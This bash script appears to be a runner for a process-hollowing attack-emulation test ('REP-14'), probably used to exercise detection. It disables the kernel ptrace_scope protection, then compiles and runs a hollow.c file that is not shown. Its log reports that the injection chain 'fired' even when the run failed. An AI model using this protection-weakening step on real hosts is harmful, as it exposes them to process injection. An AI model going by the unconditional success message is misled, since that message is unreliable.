#!/usr/bin/env bash
set -euo pipefail
LOG=/tmp/attack.log
echo "=== REP-14 Process Hollowing started $(date -u) ===" | tee -a "$LOG"

PTRACE_SCOPE=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "0")
if [ "$PTRACE_SCOPE" -gt 0 ]; then
    echo "Setting ptrace_scope=0 for test" >> "$LOG"
    echo 0 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || true
fi

WORKDIR="/tmp/rep14_build"
mkdir -p "$WORKDIR"
cp "$(dirname "$0")/hollow.c" "$WORKDIR/"

gcc -o "$WORKDIR/hollow" "$WORKDIR/hollow.c" 2>>"$LOG" \
  && echo "Compiled hollow" >> "$LOG" \
  || { echo "Compile failed, synthetic only" >> "$LOG"; }

if [ -x "$WORKDIR/hollow" ]; then
    "$WORKDIR/hollow" 2>&1 | tee -a "$LOG" || true
    echo "Real path succeeded: clone+ptrace+mmap chain fired" >> "$LOG"
fi

echo "=== REP-14 complete ===" | tee -a "$LOG"
